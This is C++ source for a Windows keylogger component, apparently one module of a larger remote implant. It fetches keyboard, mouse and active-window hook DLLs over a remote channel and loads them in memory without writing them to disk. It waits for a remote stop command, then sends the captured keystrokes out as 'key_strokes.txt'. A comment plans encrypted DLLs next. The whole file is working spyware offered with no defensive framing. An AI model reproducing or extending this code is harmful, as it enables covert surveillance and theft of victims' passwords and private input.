//cl /EHsc .\keylogger.cpp .\MemoryModule.c /link ws2_32.lib user32.lib /OUT:keylogger.exe
//cl /EHsc /LD .\keylogger.cpp /link user32.lib
/*
    use encrypted dlls next
*/
#define WIN32_LEAN_AND_MEAN
#define DEBUG 1

#if DEBUG
    #include <iostream>
#endif
#include <windows.h>
#include <string>
#include <sstream>
#include <mutex>
#include <vector>

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void *vpDLL_k = nullptr, *vpDLL_m = nullptr, *vpDLL_w = nullptr;
bool running = true;
std::vector<std::string> shared_vector;

typedef struct INIT_PARAMS
{
    void* base_address;

    void* (*FindExportAddress)(HMODULE, const char*);
    void* (*MemoryLoadLibrary)(const void *, size_t);
    void (*MemoryFreeLibrary)(void*);
    void* (*MemoryGetBaseAddress)(void*);
}INIT_PARAMS;
INIT_PARAMS* pStruct = nullptr;

//------------------------------------------------------------------------------------------------------------------------------

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);
typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

//==============================================================================================================================

typedef void(*InitializeFunc)(std::vector<std::string>*);
typedef void(*CleanupFunc)();
InitializeFunc init_active_window, init_mouse, init_keyboard;
CleanupFunc cleanup_aw, cleanup_m, cleanup_kb;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int load_dlls();
BOOL CtrlHandler(DWORD fdwCtrlType);
int main_thing();

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

__declspec(dllexport) int target_init_KL(INIT_PARAMS* params)
{
    #if DEBUG
    std::cout << "in Keyloggr" << std::endl;
    #endif

    ::pStruct = params;

    receive_data_raw = (RecvDataRawFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data = (RecvDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data = (SendDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
    if(!receive_data || !send_data || !receive_data_raw)
    {
        #if DEBUG
        std::cerr << "Failed to get one or more function addresses.\n";
        #endif

        return 0;
    }
    #if DEBUG
    std::cout << "Got Functions" << std::endl;
    #endif
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    if(!load_dlls())
    {
        #if DEBUG
        std::cerr << "Something failed in loading dll.\n";
        #endif
    }

    main_thing();

    return 1;
}

int load_dlls()
{

    //------------------------------------------------------------------------------------------------------------------------------

    std::vector<unsigned char> vdll_k, vdll_m, vdll_w;

    vdll_k = receive_data_raw("keylog_k_lib.dll");
    std::this_thread::sleep_for(std::chrono::milliseconds(50 + (rand() % 100)));
    vdll_m = receive_data_raw("keylog_m_lib.dll");
    std::this_thread::sleep_for(std::chrono::milliseconds(50 + (rand() % 100)));
    vdll_w = receive_data_raw("keylog_w_lib.dll");

    #if DEBUG
    std::cout << "Downloaded the dlls" << std::endl;
    #endif

    //------------------------------------------------------------------------------------------------------------------------------

    vpDLL_k = pStruct->MemoryLoadLibrary(vdll_k.data(), vdll_k.size());
    if(vpDLL_k == nullptr)
    {
        #if DEBUG
        std::cerr << "Failed to load DLL from memory.\n";
        #endif

        return 0;
    }
    #if DEBUG
    std::cout << "Loaded keyboard" << std::endl;
    #endif

    void* BaseAddress = pStruct->MemoryGetBaseAddress(vpDLL_k);

    init_keyboard = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_kb = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Cleanup@@YAXXZ");
    if(!init_keyboard || !cleanup_kb)
    {
        #if DEBUG
        std::cerr << "Failed to get one or more function addresses for keyboard dll.\n";
        #endif
        
        pStruct->MemoryFreeLibrary(vpDLL_k);
        return 0;
    }

    #if DEBUG
    std::cout << "Got all the module of Keyboard" << std::endl;
    #endif

    // //------------------------------------------------------------------------------------------------------------------------------

    vpDLL_m = pStruct->MemoryLoadLibrary(vdll_m.data(), vdll_m.size());
    if(vpDLL_m == nullptr)
    {
        #if DEBUG
        std::cerr << "Failed to load DLL from memory.\n";
        #endif

        return 0;
    }

    BaseAddress = pStruct->MemoryGetBaseAddress(vpDLL_m);

    init_mouse = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_m = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Cleanup@@YAXXZ");
    if(!init_mouse || !cleanup_m)
    {
        #if DEBUG
        std::cerr << "Failed to get one or more function addresses for mouse dll.\n";
        #endif

        pStruct->MemoryFreeLibrary(vpDLL_m);
        return 0;
    }

    #if DEBUG
    std::cout << "Got all the module of mouse" << std::endl;
    #endif


    // //------------------------------------------------------------------------------------------------------------------------------

    vpDLL_w = pStruct->MemoryLoadLibrary(vdll_w.data(), vdll_w.size());
    if(vpDLL_w == nullptr)
    {
        #if DEBUG
        std::cerr << "Failed to load DLL from memory.\n";
        #endif

        return 0;
    }

    BaseAddress = pStruct->MemoryGetBaseAddress(vpDLL_w);

    init_active_window = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_aw = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Cleanup@@YAXXZ");
    if(!init_active_window || !cleanup_aw)
    {
        #if DEBUG
        std::cerr << "Failed to get one or more function addresses for init_active_window dll.\n";
        #endif

        pStruct->MemoryFreeLibrary(vpDLL_w);
        return 0;
    }

    #if DEBUG
    std::cout << "Got all the module of window" << std::endl;
    #endif


    //------------------------------------------------------------------------------------------------------------------------------

    #if DEBUG
    std::cout << "Got all the module functions" << std::endl;
    #endif

    return 1;
}

int main_thing()
{            
    #if DEBUG
    std::cout << "In main" << std::endl;
    #endif

    std::atomic<bool> receivedTerminationSignal(false);

    // Set the console control handler
    if(!SetConsoleCtrlHandler(CtrlHandler, TRUE))
    {
        #if DEBUG
        std::cerr << "Error setting console control handler" << std::endl;
        #endif

        return 0;
    }

    init_active_window(&shared_vector);
    init_keyboard(&shared_vector);
    init_mouse(&shared_vector);

    #if DEBUG
    std::cout << "Every dll init done" << std::endl;
    #endif

    std::thread terminationCheckThread([&]()
    {
        while(true)
        {
            std::string a = receive_data("klogger_cmd.txt");
            if(a[0] == 's')
            {
                receivedTerminationSignal = true;
                send_data("klogger_cmd.txt","`");

                std::ostringstream oss;
                for (const auto& entry : shared_vector) oss << entry;
                send_data("key_strokes.txt",oss.str());

                cleanup_kb();
                cleanup_m();
                cleanup_aw();
                break; 
            }
            #if DEBUG
            std::cout << "Waiting for stop [Keylogger]" << std::endl;
            #endif

            std::this_thread::sleep_for(std::chrono::milliseconds(1000)); 
        }
    });

    #if DEBUG
    std::cout << "thread done " << std::endl;
    #endif
    
    // Main thread continues to process Windows messages
    MSG msg;
    while (!receivedTerminationSignal)
    {
        if(PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE)) std::this_thread::sleep_for(std::chrono::milliseconds(10));
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    terminationCheckThread.join();

    pStruct->MemoryFreeLibrary(vpDLL_k);
    pStruct->MemoryFreeLibrary(vpDLL_m);
    pStruct->MemoryFreeLibrary(vpDLL_w);

    #if DEBUG
    std::cout << "Freed dlls" << std::endl;
    #endif

    return 1;
}

BOOL CtrlHandler(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
        case CTRL_LOGOFF_EVENT:
        case CTRL_SHUTDOWN_EVENT:
        {
            running = false;
            
            cleanup_kb();
            cleanup_m();
            cleanup_aw();

            pStruct->MemoryFreeLibrary(vpDLL_k);
            pStruct->MemoryFreeLibrary(vpDLL_m);
            pStruct->MemoryFreeLibrary(vpDLL_w);

            return TRUE;
        }
        default:
        {
            return FALSE;
        }
    }
}

